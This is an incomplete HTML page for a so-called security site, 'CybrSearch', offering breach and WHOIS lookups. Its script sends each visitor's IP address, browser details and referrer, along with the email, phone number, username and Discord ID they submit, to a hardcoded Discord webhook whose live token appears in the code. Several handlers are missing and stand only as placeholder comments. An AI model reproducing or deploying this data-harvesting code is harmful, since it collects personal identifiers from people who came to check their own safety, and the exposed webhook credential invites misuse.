<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CybrSearch - Advanced Security Tools</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --dark-bg: #0f172a;
      --darker-bg: #0b1120;
      --card-bg: #1e293b;
      --accent: #3b82f6;
      --danger: #ef4444;
      --success: #10b981;
      --warning: #f59e0b;
      --text: #ffffff; /* Changed to pure white */
      --text-muted: #cbd5e1; /* Lighter muted text */
      --purple: #8b5cf6;
    }
    
    body {
      background-color: var(--dark-bg);
      color: var(--text); /* White text */
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      line-height: 1.6;
    }
    
    /* Rest of your existing CSS remains the same */
    .navbar-brand {
      font-weight: 700;
      letter-spacing: 0.5px;
      font-size: 1.5rem;
      color: var(--text) !important; /* Ensure white text */
    }
    
    /* ... (keep all your existing styles) ... */
    
    /* Additional style for logs display */
    .log-container {
      background-color: var(--darker-bg);
      border-radius: 8px;
      padding: 15px;
      margin-top: 20px;
      max-height: 300px;
      overflow-y: auto;
    }
    
    .log-entry {
      font-family: 'Courier New', monospace;
      font-size: 0.85rem;
      margin-bottom: 5px;
      padding: 5px;
      border-left: 2px solid var(--accent);
    }
    
    .log-timestamp {
      color: var(--text-muted);
    }
    
    .log-message {
      color: var(--text);
    }
    
    .log-error {
      color: var(--danger);
    }
  </style>
</head>
<body>
  <!-- Your existing HTML remains the same until the breachResults section -->
  
  <div id="breachResults"></div>
  
  <!-- Add this log container at the bottom of your content -->
  <div class="container py-3">
    <div class="row justify-content-center">
      <div class="col-lg-10">
        <div class="card">
          <div class="card-header">
            <h5><i class="fas fa-terminal me-2"></i>Activity Log</h5>
          </div>
          <div class="card-body p-0">
            <div class="log-container" id="logContainer">
              <div class="log-entry">
                <span class="log-timestamp">[System] </span>
                <span class="log-message">Initialized CybrSearch v2.1.0</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Updated logging functionality
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382930697114882129/SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO";
    let activityLog = [];
    
    function addLog(message, isError = false) {
      const timestamp = new Date().toISOString();
      const logEntry = {
        timestamp,
        message,
        isError
      };
      activityLog.push(logEntry);
      
      // Update UI
      const logContainer = document.getElementById('logContainer');
      const logElement = document.createElement('div');
      logElement.className = 'log-entry';
      logElement.innerHTML = `
        <span class="log-timestamp">[${new Date(timestamp).toLocaleTimeString()}] </span>
        <span class="${isError ? 'log-error' : 'log-message'}">${message}</span>
      `;
      logContainer.appendChild(logElement);
      logContainer.scrollTop = logContainer.scrollHeight;
      
      return logEntry;
    }
    
    // Initialize with first log
    addLog("System initialized");
    
    // Updated logToDiscord function
    async function logToDiscord(data) {
      const logEntry = addLog(`Sending ${data.type} data to Discord...`);
      
      try {
        const embed = {
          title: data.type === "breach" 
            ? (data.error ? "‚ö†Ô∏è Breach Scan Error" : data.hasBreaches ? "üîç Breach Found" : "‚úÖ No Breaches Found")
            : (data.error ? "‚ö†Ô∏è WHOIS Lookup Error" : "üåê WHOIS Lookup"),
          color: data.error ? 0xef4444 : 
                 data.type === "breach" ? (data.hasBreaches ? 0xef4444 : 0x10b981) : 0x3b82f6,
          fields: [
            { name: "Tool", value: data.type === "breach" ? "Breach Scanner" : "ARIN WHOIS Lookup", inline: true },
            { name: "Visitor IP", value: data.visitorIp || "Unknown", inline: true },
            { name: "User Agent", value: data.userAgent || "Unknown" },
            { name: "Referrer", value: data.referrer || "Direct" },
            { name: "Time", value: new Date(data.timestamp).toUTCString() }
          ],
          footer: { text: "CybrSearch Logger" }
        };
        
        if (data.error) {
          embed.fields.push({ name: "Error", value: data.error });
        } else if (data.type === "breach") {
          embed.fields.push(
            { name: "Email", value: data.email || "Not provided", inline: true },
            { name: "Phone", value: data.phone || "Not provided", inline: true },
            { name: "Username", value: data.username || "Not provided", inline: true },
            { name: "Discord ID", value: data.discord || "Not provided", inline: true }
          );
        } else if (data.type === "whois") {
          embed.fields.push(
            { name: "Lookup IP", value: data.ip || "Unknown", inline: true },
            { name: "Network Name", value: data.whoisData?.net?.name?.['$'] || "Not available", inline: true },
            { name: "Organization", value: data.whoisData?.org?.name?.['$'] || data.whoisData?.customer?.name?.['$'] || "Not available", inline: true }
          );
        }
        
        const response = await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: "CybrSearch Bot",
            avatar_url: "https://i.imgur.com/7VZ0hWY.png",
            embeds: [embed]
          })
        });
        
        if (!response.ok) throw new Error(`Discord returned status ${response.status}`);
        logEntry.message += " - Success";
        return true;
      } catch (error) {
        logEntry.message += ` - Failed: ${error.message}`;
        logEntry.isError = true;
        const logElement = document.querySelector(`#logContainer div:last-child`);
        if (logElement) {
          logElement.querySelector('.log-message').textContent = logEntry.message;
          logElement.querySelector('.log-message').className = 'log-error';
        }
        return false;
      }
    }

    // Update your form handlers to include logging:
    document.getElementById('breachForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const breachData = {
        email: document.getElementById('breachEmail').value.trim(),
        phone: document.getElementById('breachPhone').value.trim(),
        username: document.getElementById('breachUsername').value.trim(),
        discord: document.getElementById('breachDiscord').value.trim()
      };
      
      addLog(`Starting breach scan for: ${JSON.stringify(breachData)}`);
      
      // ... rest of your breach form handler ...
      
      try {
        const visitorIp = await getVisitorIp();
        addLog(`Visitor IP: ${visitorIp}`);
        const scanResults = await checkBreachDatabases(breachData);
        
        // ... process results ...
        
        await logToDiscord({
          type: "breach",
          ...breachData,
          visitorIp: visitorIp,
          userAgent: navigator.userAgent,
          referrer: document.referrer || 'Direct',
          timestamp: new Date().toISOString(),
          hasBreaches: scanResults.hasBreaches,
          breaches: scanResults.breaches
        });
        
      } catch (error) {
        addLog(`Breach scan failed: ${error.message}`, true);
        // ... error handling ...
      }
    });

    // Similarly update the WHOIS form handler
    document.getElementById('whoisForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const ip = document.getElementById('whoisIp').value.trim();
      addLog(`Starting WHOIS lookup for IP: ${ip}`);
      
      // ... rest of your WHOIS form handler ...
    });
  </script>
</body>
</html>
